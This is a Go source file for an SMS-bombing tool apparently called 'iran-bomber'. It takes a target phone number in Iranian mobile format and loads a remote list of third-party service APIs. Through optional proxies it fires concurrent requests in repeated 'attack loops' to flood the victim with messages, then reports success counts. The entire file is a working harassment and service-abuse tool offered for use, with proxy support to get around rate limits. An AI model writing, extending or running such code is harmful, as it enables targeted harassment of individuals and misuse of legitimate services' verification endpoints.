package main

import (
	"flag"
	"log"
	"strconv"
	"strings"
)

func isNumeric(s string) bool {
	if s == "" {
		return false
	}
	_, err := strconv.Atoi(s)
	return err == nil
}

func main() {
	ClearConsole()
	PrintLogoString()

	// Define and parse command-line flags
	phone := flag.String("phone", "", "Target phone number")
	concurrency := flag.Int("c", 100, "Number of concurrent requests")
	apiFile := flag.String("api", "https://raw.githubusercontent.com/M-logique/iran-bomber/refs/heads/master/api-tiny.json", "Path to the API JSON file or a URL")
	filterURL := flag.String("url", "", "Optional: Filter APIs by URL")
	proxyFile := flag.String("proxy-file", "", "Optional: Path to a file with proxies")
	proxyURL := flag.String("proxy-url", "", "Optional: URL to a list of proxies")
	loopCount := flag.Int("loop", 1, "How many times the attack repeats")
	flag.Parse()

	// Interactive mode if phone number is not provided via flag
	if *phone == "" {
		phonePrompt := ColorCyan + "[=]" + ColorGray + " Enter phone number " + ColorCyan + "[e.g., 9123456789]" + ColorGray + ": " + ColorGreen
		*phone = GetInput(phonePrompt, func(x string) bool {
			return x != "" && isNumeric(x) && strings.HasPrefix(x, "9") && len(x) == 10
		})

		loopPrompt := ColorCyan + "[=]" + ColorGray + " Enter loop count (default " + strconv.Itoa(*loopCount) + "): " + ColorGreen
		loopStr := GetInput(loopPrompt, func(x string) bool {
			if x == "" { return true }
			if !isNumeric(x) { return false }
			n, err := strconv.Atoi(x)
			return err == nil && n > 0
		})
		if loopStr != "" {
			n, _ := strconv.Atoi(loopStr)
			*loopCount = n
		}
	}

	if *proxyFile != "" && *proxyURL != "" {
		log.Fatalf("%s[!] Please provide either -proxy-file or -proxy-url, not both.%s", ColorRed, ColorReset)
	}

	// 1. Load Proxies
	proxies, err := LoadProxies(*proxyFile, *proxyURL)
	if err != nil {
		log.Fatalf("%s[!] %v%s", ColorRed, err, ColorReset)
	}

	// 2. Load and filter APIs
	apis, err := LoadAndFilterAPIs(*apiFile, *filterURL, *phone)
	if err != nil {
		log.Fatalf("%s[!] %v%s", ColorRed, err, ColorReset)
	}

	// 3. Create the Bomber instance
	bomber, err := NewBomber(apis, proxies)
	if err != nil {
		log.Fatalf("%s[!] Failed to initialize bomber: %v%s", ColorRed, err, ColorReset)
	}

	// 4. Run the attack loop
	for i := 0; i < *loopCount; i++ {
		if *loopCount > 1 {
			log.Printf("\n%s--- Starting Attack Loop %d of %d ---%s", ColorBlue, i+1, *loopCount, ColorReset)
		}
		bomber.SendRequests(*phone, *concurrency)
	}

	// 5. Print the final summary
	total, success, failed := bomber.GetStats()
	PrintSummary(total*int32(*loopCount), success, failed)
}